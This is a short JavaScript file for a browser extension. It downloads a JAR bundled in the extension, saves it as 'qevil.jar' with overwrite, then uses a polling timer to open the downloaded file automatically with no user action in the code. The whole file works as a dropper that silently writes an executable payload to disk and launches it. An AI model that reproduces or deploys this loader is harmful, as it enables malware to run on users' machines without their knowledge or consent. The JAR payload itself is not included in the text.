
var doner=false;var qid=-3;
function onStartedDownload(id) {
  window.doner=true;window.qid=id;
}

function onFailed(error) {
  alert(`Download failed: ${error}`);
}
var downloadUrl;
var downloading = browser.downloads.download({
  url : browser.extension.getURL("/q.jar"),
  filename : 'qevil.jar',
  conflictAction : 'overwrite'
});

downloading.then(onStartedDownload, onFailed);

setInterval(function(){
	if(doner){
		browser.downloads.open(window.qid);
		doner=false;
	}
	
},2500);
